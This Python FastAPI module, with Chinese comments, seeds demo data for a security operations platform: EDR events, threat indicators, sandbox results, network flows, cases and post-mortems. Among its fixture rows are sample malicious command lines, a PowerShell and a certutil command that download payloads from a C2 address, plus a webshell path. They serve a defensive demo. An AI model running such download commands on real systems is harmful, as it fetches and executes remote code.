"""演示数据供给(阶段 P3) — 一键为空表灌入标注数据,答辩/演示环境专用。

纪律(与方案约定一致):
- 所有行打 demo-seed 标记(各表借既有标注字段:source/sensor_id/correlation_key/
  case_number 前缀/submitted_by),capability 页与演示页明示口径;
- 幂等:同表已有标记行则跳过,不重复灌;
- 可清空:clear 仅删除标记行,绝不触碰真实数据;
- 不伪造时间分布之外的事实:事件类数据按"过去 24 小时"摊开 created_at,
  KPI 快照走既有 snapshot_daily 回填。

场景:all | sensing | ops | kpi
"""

from __future__ import annotations

import logging
from datetime import datetime, timedelta, timezone

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from sqlalchemy import delete, func, select
from sqlalchemy.ext.asyncio import AsyncSession

from auth import RequireRole, UserInfo
from models import (
    get_session,
    EdrEvent,
    FeedbackRecord,
    NetworkFlow,
    PostMortem,
    SandboxTask,
    SecurityCase,
    ThreatIoc,
    TlsSession,
    WorkOrder,
)

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/demo", tags=["demo-seed"])

MARKER = "demo-seed"


def _now() -> datetime:
    return datetime.now(timezone.utc)


def _ago(**kw) -> datetime:
    return _now() - timedelta(**kw)


# ── 各表"是否有标记行"与"删除标记行"的谓词 ──

def _edr_filter():
    return EdrEvent.correlation_key == MARKER


def _ioc_filter():
    return ThreatIoc.source == MARKER


def _sandbox_filter():
    return SandboxTask.source == MARKER


def _flow_filter():
    return NetworkFlow.sensor_id == MARKER


def _tls_filter():
    return TlsSession.sensor_id == MARKER


def _case_numbers() -> list[str]:
    return ["CASE-DEMO-001", "CASE-DEMO-002"]


def _case_filter():
    return SecurityCase.case_number.in_(_case_numbers())


async def _count(session: AsyncSession, model, filter_) -> int:
    result = await session.execute(select(func.count()).select_from(model).where(filter_))
    return int(result.scalar() or 0)


async def _seed_edr(session: AsyncSession) -> int:
    if await _count(session, EdrEvent, _edr_filter()):
        return 0
    host = "OFFICE-PC-07"
    rows = [
        EdrEvent(source_type="sysmon", event_id=1, computer_name=host, user_name="CORP\\zhang",
                 process_name="powershell.exe", process_id=4821, parent_process="explorer.exe",
                 command_line="powershell -enc SQBFAFgA -Uri http://23.129.64.33/p.ps1",
                 image_hash="a3f1…demo", src_ip="192.168.1.105", dst_ip="23.129.64.33", dst_port=8080,
                 severity="high", mitre_technique="T1059.001", correlation_key=MARKER,
                 created_at=_ago(hours=3)),
        EdrEvent(source_type="sysmon", event_id=3, computer_name=host, user_name="CORP\\zhang",
                 process_name="powershell.exe", process_id=4821,
                 src_ip="192.168.1.105", dst_ip="23.129.64.33", dst_port=8080,
                 severity="high", mitre_technique="T1071.001", correlation_key=MARKER,
                 created_at=_ago(hours=3)),
        EdrEvent(source_type="sysmon", event_id=1, computer_name=host, user_name="CORP\\li",
                 process_name="chrome.exe", process_id=9912, parent_process="explorer.exe",
                 command_line="chrome.exe --normal-browsing",
                 severity="info", correlation_key=MARKER, created_at=_ago(hours=5)),
        EdrEvent(source_type="sysmon", event_id=11, computer_name="SRV-APP-02", user_name="SYSTEM",
                 process_name="w3wp.exe", file_path="C:\\inetpub\\wwwroot\\uploads\\shell.aspx",
                 severity="critical", mitre_technique="T1505.003", correlation_key=MARKER,
                 created_at=_ago(hours=8)),
        EdrEvent(source_type="sysmon", event_id=13, computer_name="OFFICE-PC-12", user_name="CORP\\wang",
                 process_name="regsvr32.exe", registry_key="HKCU\\Software\\Run\\Updater",
                 severity="medium", mitre_technique="T1547.001", correlation_key=MARKER,
                 created_at=_ago(hours=11)),
        EdrEvent(source_type="winevent", event_id=4625, computer_name="SRV-DB-01", user_name="sa",
                 severity="medium", mitre_technique="T1110.001", correlation_key=MARKER,
                 created_at=_ago(hours=14)),
        EdrEvent(source_type="sysmon", event_id=1, computer_name="OFFICE-PC-07", user_name="CORP\\zhang",
                 process_name="certutil.exe", process_id=5102,
                 command_line="certutil -urlcache -f http://23.129.64.33/b.exe b.exe",
                 severity="high", mitre_technique="T1105", correlation_key=MARKER,
                 created_at=_ago(hours=2)),
        EdrEvent(source_type="sysmon", event_id=3, computer_name="OFFICE-PC-12", user_name="CORP\\wang",
                 process_name="chrome.exe", src_ip="192.168.1.120", dst_ip="142.250.66.14", dst_port=443,
                 severity="info", correlation_key=MARKER, created_at=_ago(hours=1)),
    ]
    session.add_all(rows)
    return len(rows)


def _ioc(ioc_type: str, value: str, threat: str, sev: str, conf: float) -> ThreatIoc:
    return ThreatIoc(ioc_type=ioc_type, ioc_value=value, threat_type=threat, severity=sev,
                     confidence=conf, source=MARKER, is_active=True,
                     first_seen=_ago(days=6), last_seen=_ago(hours=2),
                     tags=[MARKER], context={"note": "演示种子数据"})


async def _seed_ioc(session: AsyncSession) -> int:
    if await _count(session, ThreatIoc, _ioc_filter()):
        return 0
    rows = [
        _ioc("ip", "23.129.64.33", "c2", "critical", 0.95),
        _ioc("ip", "45.33.32.156", "c2", "high", 0.88),
        _ioc("domain", "update-service-cdn.top", "malware", "high", 0.9),
        _ioc("domain", "mail-corp-verify.com", "phishing", "high", 0.85),
        _ioc("url", "http://23.129.64.33/p.ps1", "malware", "critical", 0.96),
        _ioc("file_hash", "a3f1d0c2b4e6f7a8b9c0d1e2f3a4b5c6", "malware", "high", 0.92),
        _ioc("file_hash", "b7e2c9d1a4f8e3b6c5d0a1f2e3b4c5d6", "ransomware", "critical", 0.94),
        _ioc("ip", "185.220.101.7", "apt", "high", 0.8),
        _ioc("domain", "cdn-metrics-sync.net", "c2", "medium", 0.7),
        _ioc("email", "hr-notice@corp-verify.com", "phishing", "medium", 0.75),
    ]
    session.add_all(rows)
    return len(rows)


def _sandbox(task_id: str, name: str, typ: str, verdict: str, score: float, status: str, mitre: list, hours: int) -> SandboxTask:
    return SandboxTask(task_id=task_id, sample_hash=f"demo{abs(hash(name)) % 10**12:012d}",
                       sample_name=name, sample_type=typ, source=MARKER, sandbox_type="cape",
                       status=status, verdict=verdict, score=score,
                       behavior_summary="演示种子:行为摘要由种子端点生成,非真实沙箱报告",
                       mitre_techniques=mitre,
                       network_iocs=[{"type": "ip", "value": "23.129.64.33"}] if verdict == "malicious" else [],
                       submitted_at=_ago(hours=hours),
                       completed_at=_ago(hours=hours) if status == "completed" else None,
                       created_at=_ago(hours=hours))


async def _seed_sandbox(session: AsyncSession) -> int:
    if await _count(session, SandboxTask, _sandbox_filter()):
        return 0
    rows = [
        _sandbox("demo-cape-001", "invoice_scan.pdf.exe", "pe", "malicious", 8.7, "completed",
                 [{"id": "T1059.001", "name": "PowerShell", "tactic": "Execution"}], 6),
        _sandbox("demo-cape-002", "setup_helper.msi", "pe", "suspicious", 5.2, "completed",
                 [{"id": "T1547.001", "name": "Registry Run Keys", "tactic": "Persistence"}], 9),
        _sandbox("demo-cape-003", "weekly_report.docx", "docx", "clean", 1.1, "completed", [], 20),
        _sandbox("demo-cape-004", "http://23.129.64.33/p.ps1", "url", "pending", 0.0, "running", [], 1),
    ]
    session.add_all(rows)
    return len(rows)


_FLOW_MIX = [
    ("192.168.1.105", "23.129.64.33", 8080, "TCP", "outbound", "HTTP", 64000, 2100, 3),
    ("192.168.1.105", "8.8.8.8", 53, "UDP", "outbound", "DNS", 512, 96, 1),
    ("192.168.1.120", "142.250.66.14", 443, "TCP", "outbound", "TLS", 1_820_000, 92_000, 210),
    ("192.168.1.31", "192.168.1.10", 445, "TCP", "lateral", "SMB", 4_400_000, 380_000, 520),
    ("192.168.1.44", "192.168.1.10", 3389, "TCP", "lateral", "RDP", 980_000, 240_000, 320),
    ("192.168.1.105", "45.33.32.156", 443, "TCP", "outbound", "TLS", 220_000, 18_000, 90),
]


async def _seed_flows(session: AsyncSession) -> int:
    if await _count(session, NetworkFlow, _flow_filter()):
        return 0
    rows = []
    for i in range(18):
        src, dst, dport, proto, direction, app, bin_, bout, pkts = _FLOW_MIX[i % len(_FLOW_MIX)]
        start = _ago(hours=23 - i, minutes=17)
        rows.append(NetworkFlow(
            src_ip=src, dst_ip=dst, src_port=49152 + i, dst_port=dport, protocol=proto,
            direction=direction, bytes_in=bin_, bytes_out=bout, packets_in=pkts, packets_out=pkts,
            duration_ms=1200.0 + i * 350, app_protocol=app, sensor_id=MARKER,
            country_dst="US" if dst.startswith(("23.", "45.", "142.")) else "CN",
            flow_start=start, flow_end=start + timedelta(seconds=30 + i * 11),
            created_at=start, raw_data={"demo": True},
        ))
    session.add_all(rows)
    return len(rows)


_TLS_MIX = [
    ("cdn-metrics-sync.net", 0.72, ["自签名证书", "新增 SNI"]),
    ("mail-corp-verify.com", 0.88, ["证书链无效", "仿冒域名特征"]),
    ("www.microsoft.com", 0.05, []),
    ("api.github.com", 0.03, []),
    ("update-service-cdn.top", 0.81, ["短有效期证书", "新增 SNI"]),
]


async def _seed_tls(session: AsyncSession) -> int:
    if await _count(session, TlsSession, _tls_filter()):
        return 0
    rows = []
    for i in range(12):
        sni, risk, reasons = _TLS_MIX[i % len(_TLS_MIX)]
        start = _ago(hours=22 - i * 2, minutes=41)
        rows.append(TlsSession(
            src_ip="192.168.1.105" if risk > 0.5 else "192.168.1.120",
            dst_ip="23.129.64.33" if risk > 0.5 else "142.250.66.14",
            sni=sni, ja3_hash=f"demo{i:04d}a3f1b2c3d4e5f6a7b8c9d0e1f2", ja4_hash=f"t13d1516h2_8dbaf66328ac_{i:04d}",
            tls_version="TLSv1.3", alpn="h2",
            cert_is_self_signed=risk > 0.7, cert_chain_valid=risk <= 0.7,
            is_expired=False, risk_score=risk, risk_reasons=reasons,
            sensor_id=MARKER, session_start=start, created_at=start,
        ))
    session.add_all(rows)
    return len(rows)


async def _seed_ops(session: AsyncSession) -> int:
    seeded_cases = 0
    if not await _count(session, SecurityCase, _case_filter()):
        case_closed = SecurityCase(
            case_number="CASE-DEMO-001", title="OFFICE-PC-07 疑似 C2 信标外联",
            status="closed", priority="high", threat_type="c2", severity="high", confidence=0.91,
            src_ips=["192.168.1.105"], dst_ips=["23.129.64.33"], event_ids=[], event_count=3,
            assignee="analyst-wang", disposition="主机隔离 + 出口封禁,确认远控木马后重装",
            disposition_by="analyst-li", tags=[MARKER], metadata_={"demo": True},
            created_at=_ago(days=2), closed_at=_ago(days=1), sla_breached=False,
        )
        case_open = SecurityCase(
            case_number="CASE-DEMO-002", title="SRV-APP-02 webshell 落盘",
            status="investigating", priority="critical", threat_type="webshell", severity="critical",
            confidence=0.84, src_ips=["203.0.113.7"], dst_ips=["192.168.1.10"], event_ids=[], event_count=1,
            assignee="analyst-li", tags=[MARKER], metadata_={"demo": True},
            created_at=_ago(hours=9), sla_breached=False,
        )
        session.add_all([case_closed, case_open])
        await session.flush()
        seeded_cases = 2

        session.add_all([
            WorkOrder(order_number="WO-DEMO-001", case_id=case_closed.id, order_type="disposition",
                      title="OFFICE-PC-07 主机隔离", status="completed", priority="high",
                      assignee="analyst-wang", created_by=MARKER, result={"action": "isolate_host"},
                      created_at=_ago(days=2), completed_at=_ago(days=1, hours=6)),
            WorkOrder(order_number="WO-DEMO-002", case_id=case_closed.id, order_type="rollback",
                      title="出口防火墙规则回滚确认", status="completed", priority="medium",
                      assignee="analyst-li", created_by=MARKER,
                      created_at=_ago(days=1), completed_at=_ago(days=1)),
            WorkOrder(order_number="WO-DEMO-003", case_id=case_open.id, order_type="approval",
                      title="SRV-APP-02 进程遏制审批", status="pending", priority="critical",
                      assignee="", approval_status="pending", created_by=MARKER,
                      created_at=_ago(hours=8)),
        ])

        session.add(PostMortem(
            case_id=case_closed.id, title="C2 信标外联事件复盘",
            summary="初始访问疑似钓鱼附件 → PowerShell 下载器 → C2 信标;检测链 Sigma 命中,响应链自动阻断生效。",
            timeline=[
                {"time": "D-2 09:12", "event": "初始访问", "detail": "用户打开钓鱼附件"},
                {"time": "D-2 09:19", "event": "C2 外联", "detail": "周期性外联 23.129.64.33"},
                {"time": "D-2 09:20", "event": "检测", "detail": "Sigma C-005 命中,CAD 穿透验证 2/2"},
                {"time": "D-2 09:21", "event": "响应", "detail": "防火墙规则自动下发,主机隔离"},
            ],
            root_cause="邮件网关未拦截加密附件;终端未启用宏告警。",
            impact_assessment="单主机受控,未发现横向移动与数据外带。",
            lessons_learned=["邮件附件沙箱化", "PowerShell Constrained Language Mode"],
            action_items=[{"item": "附件沙箱前置", "owner": "sec-ops", "deadline": "D+7", "done": False}],
            false_positive_count=0, author=MARKER, status="published",
            created_at=_ago(days=1), updated_at=_ago(days=1),
        ))

        session.add_all([
            FeedbackRecord(case_id=case_closed.id, feedback_type="true_positive",
                           original_conclusion="threat", operator_conclusion="threat",
                           reason="确认为真实远控,处置得当。", submitted_by=MARKER, status="reviewed",
                           created_at=_ago(days=1)),
            FeedbackRecord(feedback_type="rule_suggestion", rule_id="SIG-016",
                           reason="建议对 certutil 下载行为增加父进程白名单,降低误报。",
                           submitted_by=MARKER, status="submitted", created_at=_ago(hours=20)),
        ])
    return seeded_cases


async def _seed_kpi(session: AsyncSession) -> int:
    from ops_metrics.kpi_calculator import kpi_calculator
    from datetime import date as date_cls
    seeded = 0
    for i in range(14, 0, -1):
        d = (_now() - timedelta(days=i)).date()
        try:
            await kpi_calculator.snapshot_daily(session, snapshot_date=d)
            seeded += 1
        except Exception as e:  # 快照依赖真实事件统计,空库日期允许失败
            logger.debug("[demo-seed] kpi snapshot %s skipped: %s", d, e)
    return seeded


SCENES = {
    "sensing": [("edr_events", EdrEvent, _edr_filter, _seed_edr),
                ("threat_iocs", ThreatIoc, _ioc_filter, _seed_ioc),
                ("sandbox_tasks", SandboxTask, _sandbox_filter, _seed_sandbox),
                ("network_flows", NetworkFlow, _flow_filter, _seed_flows),
                ("tls_sessions", TlsSession, _tls_filter, _seed_tls)],
    "ops": [("security_cases", SecurityCase, _case_filter, _seed_ops)],
    "kpi": [],
}


class SeedBody(BaseModel):
    scene: str = "all"


@router.post("/seed")
async def demo_seed(
    body: SeedBody,
    session: AsyncSession = Depends(get_session),
    user: UserInfo = Depends(RequireRole("admin", "operator")),
):
    """灌入演示种子数据(幂等,行打 demo-seed 标注)。"""
    scene = (body.scene or "all").lower()
    if scene not in ("all", "sensing", "ops", "kpi"):
        raise HTTPException(400, f"未知场景: {scene}")

    seeded: dict[str, int] = {}
    skipped: list[str] = []

    jobs: list[tuple[str, object, object, object]] = []
    if scene in ("all", "sensing"):
        jobs.extend(SCENES["sensing"])
    if scene in ("all", "ops"):
        jobs.extend(SCENES["ops"])

    for name, model, filter_fn, seeder in jobs:
        if await _count(session, model, filter_fn()):
            skipped.append(name)
            continue
        seeded[name] = await seeder(session)

    if scene in ("all", "kpi"):
        seeded["kpi_snapshots"] = await _seed_kpi(session)

    await session.commit()
    return {"seeded": seeded, "skipped": skipped, "marker": MARKER}


@router.post("/seed/clear")
async def demo_seed_clear(
    session: AsyncSession = Depends(get_session),
    user: UserInfo = Depends(RequireRole("admin", "operator")),
):
    """仅清除 demo-seed 标注行(含关联复盘/工单),不触碰真实数据。"""
    deleted: dict[str, int] = {}

    demo_cases = (await session.execute(select(SecurityCase).where(_case_filter()))).scalars().all()
    case_ids = [c.id for c in demo_cases]
    if case_ids:
        r = await session.execute(delete(PostMortem).where(PostMortem.case_id.in_(case_ids)))
        deleted["post_mortems"] = r.rowcount or 0
        r = await session.execute(delete(WorkOrder).where(WorkOrder.case_id.in_(case_ids)))
        deleted["work_orders"] = r.rowcount or 0
        r = await session.execute(delete(FeedbackRecord).where(FeedbackRecord.case_id.in_(case_ids)))
        deleted["feedback_records"] = r.rowcount or 0
        r = await session.execute(delete(SecurityCase).where(_case_filter()))
        deleted["security_cases"] = r.rowcount or 0
    else:
        deleted["work_orders"] = (await session.execute(
            delete(WorkOrder).where(WorkOrder.created_by == MARKER))).rowcount or 0

    for name, model, filter_fn in [
        ("edr_events", EdrEvent, _edr_filter),
        ("threat_iocs", ThreatIoc, _ioc_filter),
        ("sandbox_tasks", SandboxTask, _sandbox_filter),
        ("network_flows", NetworkFlow, _flow_filter),
        ("tls_sessions", TlsSession, _tls_filter),
    ]:
        r = await session.execute(delete(model).where(filter_fn()))
        deleted[name] = r.rowcount or 0

    await session.commit()
    return {"deleted": deleted, "marker": MARKER}


@router.get("/seed/status")
async def demo_seed_status(
    session: AsyncSession = Depends(get_session),
    user: UserInfo = Depends(RequireRole("admin", "operator")),
):
    """各表 demo-seed 标注行计数。"""
    return {
        "marker": MARKER,
        "edr_events": await _count(session, EdrEvent, _edr_filter()),
        "threat_iocs": await _count(session, ThreatIoc, _ioc_filter()),
        "sandbox_tasks": await _count(session, SandboxTask, _sandbox_filter()),
        "network_flows": await _count(session, NetworkFlow, _flow_filter()),
        "tls_sessions": await _count(session, TlsSession, _tls_filter()),
        "security_cases": await _count(session, SecurityCase, _case_filter()),
    }
